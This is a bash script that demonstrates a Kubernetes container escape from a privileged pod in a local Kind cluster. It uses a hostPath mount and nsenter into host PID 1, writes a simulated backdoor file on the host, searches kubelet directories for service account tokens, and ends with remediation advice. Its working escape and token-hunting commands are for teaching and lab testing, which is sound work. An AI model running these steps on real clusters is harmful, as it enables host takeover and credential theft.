#!/bin/bash

echo "=== Container Escape Demonstration ==="
echo ""
echo "⚠️  This demonstrates a REAL container escape vulnerability"
echo "    Running in local Kind cluster only!"
echo ""

read -p "Continue? (y/n): " confirm

if [ "$confirm" != "y" ]; then
    exit 0
fi

# Check if privileged pod exists
if ! kubectl get pod privileged-pod -n vulnerable-apps &>/dev/null; then
    echo "❌ privileged-pod not found. Run setup-vulnerable-cluster.sh first"
    exit 1
fi

echo ""
echo "Step 1: Show we're inside a container"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

kubectl exec -n vulnerable-apps privileged-pod -- bash -c '
echo "Container hostname: $(hostname)"
echo "Container processes:"
ps aux | head -5
'

echo ""
echo "Step 2: Access host filesystem (via hostPath mount)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

kubectl exec -n vulnerable-apps privileged-pod -- bash -c '
echo "Host root filesystem at /host:"
ls -la /host/ | head -10
'

echo ""
echo "Step 3: Escape via hostPID + nsenter"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

kubectl exec -n vulnerable-apps privileged-pod -- bash -c '
apt-get update -qq && apt-get install -y util-linux -qq 2>/dev/null

echo "Finding host PID 1..."
HOST_PID=$(ps aux | grep "^root.*systemd" | head -1 | awk "{print \$2}")

if [ -n "$HOST_PID" ]; then
    echo "Found host PID: $HOST_PID"
    echo ""
    echo "Executing command on HOST via nsenter:"
    nsenter -t 1 -m -u -i -n -p -- hostname
    nsenter -t 1 -m -u -i -n -p -- cat /etc/os-release | head -3
    
    echo ""
    echo "✅ Container escaped! Running commands on HOST."
fi
'

echo ""
echo "Step 4: Install backdoor on host (simulated)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

kubectl exec -n vulnerable-apps privileged-pod -- bash -c '
# Write to host filesystem
echo "CONTAINER_ESCAPED=$(date)" > /host/tmp/pwned.txt

echo "Backdoor installed at /tmp/pwned.txt on host"
echo "Contents:"
cat /host/tmp/pwned.txt
'

echo ""
echo "Step 5: Read Kubernetes secrets from host"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

kubectl exec -n vulnerable-apps privileged-pod -- bash -c '
echo "Looking for Kubernetes secrets on host filesystem..."

if [ -d "/host/var/lib/kubelet" ]; then
    echo "Found kubelet directory!"
    ls -la /host/var/lib/kubelet/pods/ 2>/dev/null | head -5
fi

# Look for service account tokens
find /host/var/lib/kubelet -name "token" -type f 2>/dev/null | head -3
'

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Container Escape SUCCESSFUL!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "What happened:"
echo "  1. Privileged container mounted host root at /host"
echo "  2. hostPID=true gave access to host processes"
echo "  3. Used nsenter to execute commands on host"
echo "  4. Installed backdoor on host filesystem"
echo "  5. Could read K8s secrets from host"
echo ""
echo "Remediation:"
echo "  - Never use privileged: true in production"
echo "  - Never use hostPID: true"
echo "  - Never use hostPath mounts"
echo "  - Enable PodSecurityPolicy/PodSecurity"
echo "  - Use security scanning (Trivy)"